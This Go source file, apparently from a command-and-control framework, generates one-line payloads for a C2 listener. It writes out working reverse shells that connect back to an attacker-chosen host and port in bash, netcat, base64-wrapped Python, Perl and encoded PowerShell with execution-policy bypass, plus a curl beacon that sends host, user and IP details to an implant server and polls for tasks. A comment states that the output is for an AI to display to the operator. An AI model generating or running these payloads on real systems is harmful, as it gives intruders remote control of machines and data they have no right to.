package c2

import (
	"encoding/json"
	"fmt"
	"net/url"
	"strings"

	"veritysec/internal/database"
)

// OnelinerKind represents the language/form of a one-liner payload.
type OnelinerKind string

const (
	OnelinerBash       OnelinerKind = "bash"        // bash reverse shell (TCP reverse listener)
	OnelinerNc         OnelinerKind = "nc"          // netcat reverse shell
	OnelinerNcMkfifo   OnelinerKind = "nc_mkfifo"   // bidirectional via mkfifo (for nc without -e support)
	OnelinerPython     OnelinerKind = "python"      // python socket reverse shell
	OnelinerPerl       OnelinerKind = "perl"        // perl reverse shell
	OnelinerPowerShell OnelinerKind = "powershell"  // PowerShell TCP reverse shell (IEX style)
	OnelinerCurl       OnelinerKind = "curl_beacon" // periodic HTTP beacon polling via curl (no binary needed)
)

// AllOnelinerKinds returns all supported oneliner types.
func AllOnelinerKinds() []OnelinerKind {
	return []OnelinerKind{
		OnelinerBash, OnelinerNc, OnelinerNcMkfifo,
		OnelinerPython, OnelinerPerl,
		OnelinerPowerShell, OnelinerCurl,
	}
}

// tcpOnelinerKinds are raw TCP reverse shell types supported only by tcp_reverse listeners
var tcpOnelinerKinds = map[OnelinerKind]bool{
	OnelinerBash:       true,
	OnelinerNc:         true,
	OnelinerNcMkfifo:   true,
	OnelinerPython:     true,
	OnelinerPerl:       true,
	OnelinerPowerShell: true,
}

// httpOnelinerKinds are types supported by http_beacon / https_beacon listeners
var httpOnelinerKinds = map[OnelinerKind]bool{
	OnelinerCurl: true,
}

// OnelinerKindsForListener returns compatible oneliner types based on the listener type
func OnelinerKindsForListener(listenerType string) []OnelinerKind {
	switch ListenerType(listenerType) {
	case ListenerTypeTCPReverse:
		return []OnelinerKind{
			OnelinerBash, OnelinerNc, OnelinerNcMkfifo,
			OnelinerPython, OnelinerPerl, OnelinerPowerShell,
		}
	case ListenerTypeHTTPBeacon, ListenerTypeHTTPSBeacon, ListenerTypeWebSocket:
		return []OnelinerKind{OnelinerCurl}
	default:
		return nil
	}
}

// IsOnelinerCompatible checks whether the oneliner type is compatible with the listener type
func IsOnelinerCompatible(listenerType string, kind OnelinerKind) bool {
	switch ListenerType(listenerType) {
	case ListenerTypeTCPReverse:
		return tcpOnelinerKinds[kind]
	case ListenerTypeHTTPBeacon, ListenerTypeHTTPSBeacon, ListenerTypeWebSocket:
		return httpOnelinerKinds[kind]
	default:
		return false
	}
}

// OnelinerInput is the input for generating a oneliner
type OnelinerInput struct {
	Kind         OnelinerKind
	Host         string // attacker callback address (IP/domain)
	Port         int    // listening port
	HTTPBaseURL  string // used for HTTPS Beacon, e.g. https://x.com
	ImplantToken string // HTTP Beacon authentication token
}

// ValidateOnelinerForListener validates whether the oneliner is compatible with the listener configuration (e.g. tcp_reverse by default requires encrypted Beacon).
func ValidateOnelinerForListener(listener *database.C2Listener, kind OnelinerKind) error {
	if listener == nil {
		return fmt.Errorf("listener is nil")
	}
	if ListenerType(listener.Type) == ListenerTypeTCPReverse && tcpOnelinerKinds[kind] {
		cfg := &ListenerConfig{}
		if strings.TrimSpace(listener.ConfigJSON) != "" {
			_ = json.Unmarshal([]byte(listener.ConfigJSON), cfg)
		}
		if !cfg.AllowLegacyShell {
			return fmt.Errorf("listener has not enabled allow_legacy_shell: tcp_reverse by default only accepts CSB1 encrypted Beacon (AES-GCM + Token); use build to generate a beacon, or explicitly enable allow_legacy_shell (not recommended for public deployments)")
		}
	}
	return nil
}

// GenerateOneliner generates a single-line payload.
// Design considerations:
//   - Does not rely on pre-installed executables on the target (except the essential bash/python/perl for the oneliner);
//   - Avoids quote nesting pitfalls: uses base64/url encoding to prevent shell escape errors;
//   - Also returns execution examples for the AI to display directly to the operator in conversation.
func GenerateOneliner(in OnelinerInput) (string, error) {
	host := strings.TrimSpace(in.Host)
	if err := ValidateBeaconDialHost(host); err != nil {
		return "", err
	}
	switch in.Kind {
	case OnelinerBash:
		if err := SafeBindPort(in.Port); err != nil {
			return "", err
		}
		// Wrap with bash -c to ensure correct execution in zsh/sh and other non-bash shells
		// /dev/tcp is a bash-specific pseudo device, must be interpreted by a bash process
		return fmt.Sprintf(`bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'`, host, in.Port), nil

	case OnelinerNc:
		if err := SafeBindPort(in.Port); err != nil {
			return "", err
		}
		return fmt.Sprintf(`nc -e /bin/sh %s %d`, host, in.Port), nil

	case OnelinerNcMkfifo:
		if err := SafeBindPort(in.Port); err != nil {
			return "", err
		}
		// Bidirectional mkfifo approach, works with nc/openbsd-nc that lack -e support
		return fmt.Sprintf(
			`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f`,
			host, in.Port,
		), nil

	case OnelinerPython:
		if err := SafeBindPort(in.Port); err != nil {
			return "", err
		}
		// python -c with single quotes; using triple quotes or escapes inside causes compatibility issues, so base64 decode then exec is used instead
		py := fmt.Sprintf(
			`import socket,os,pty;s=socket.socket();s.connect(("%s",%d));[os.dup2(s.fileno(),x) for x in (0,1,2)];pty.spawn("/bin/sh")`,
			host, in.Port,
		)
		// Wrap with b64 to avoid target shell quoting issues
		return fmt.Sprintf(
			`python3 -c "import base64,sys;exec(base64.b64decode('%s').decode())"`,
			b64StdEncode(py),
		), nil

	case OnelinerPerl:
		if err := SafeBindPort(in.Port); err != nil {
			return "", err
		}
		return fmt.Sprintf(
			`perl -e 'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
			host, in.Port,
		), nil

	case OnelinerPowerShell:
		if err := SafeBindPort(in.Port); err != nil {
			return "", err
		}
		// PowerShell TCP reverse shell (does not depend on old .NET versions)
		ps := fmt.Sprintf(
			`$c=New-Object System.Net.Sockets.TcpClient('%s',%d);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$o2=$o+'PS '+(pwd).Path+'> ';$by=([text.encoding]::ASCII).GetBytes($o2);$s.Write($by,0,$by.Length);$s.Flush()};$c.Close()`,
			host, in.Port,
		)
		return fmt.Sprintf(
			`powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand %s`,
			utf16LEBase64(ps),
		), nil

	case OnelinerCurl:
		if strings.TrimSpace(in.HTTPBaseURL) == "" {
			return "", fmt.Errorf("http_base_url is required for curl_beacon")
		}
		if strings.TrimSpace(in.ImplantToken) == "" {
			return "", fmt.Errorf("implant_token is required for curl_beacon")
		}
		base := strings.TrimRight(in.HTTPBaseURL, "/")
		return fmt.Sprintf(
			`bash -c 'H="X-Implant-Token: %s";`+
				`URL="%s";`+
				`HN=$(hostname 2>/dev/null||echo unknown);`+
				`UN=$(whoami 2>/dev/null||echo unknown);`+
				`OS=$(uname -s 2>/dev/null||echo unknown);`+
				`AR=$(uname -m 2>/dev/null||echo unknown);`+
				`IP=$(hostname -I 2>/dev/null|awk "{print \$1}"||echo "");`+
				`ST=$(od -An -N32 -tx1 /dev/urandom|tr -d " \n");[ ${#ST} -eq 64 ]||exit 1;SH="X-Session-Token: $ST";SID="";`+
				`while :;do `+
				`BODY="{\"hostname\":\"$HN\",\"username\":\"$UN\",\"os\":\"$OS\",\"arch\":\"$AR\",\"internal_ip\":\"$IP\",\"pid\":$$}";`+
				`R=$(curl -fsSk -H "$H" -H "$SH" -H "Content-Type: application/json" -X POST "$URL/check_in" -d "$BODY" 2>/dev/null);`+
				`if [ -n "$R" ]&&[ -z "$SID" ];then SID=$(echo "$R"|grep -o "\"session_id\":\"[^\"]*\""|head -1|cut -d"\"" -f4);fi;`+
				`if [ -n "$SID" ];then `+
				`T=$(curl -fsSk -H "$H" -H "$SH" -G "$URL/tasks?session_id=$SID" 2>/dev/null);`+
				`fi;`+
				`sleep 5;`+
				`done' &`,
			in.ImplantToken, base,
		), nil
	}
	return "", fmt.Errorf("unsupported oneliner kind: %s", in.Kind)
}

// urlEncodeForShell URL-encodes a string to prevent special characters from breaking shell escaping
func urlEncodeForShell(s string) string {
	return url.QueryEscape(s)
}
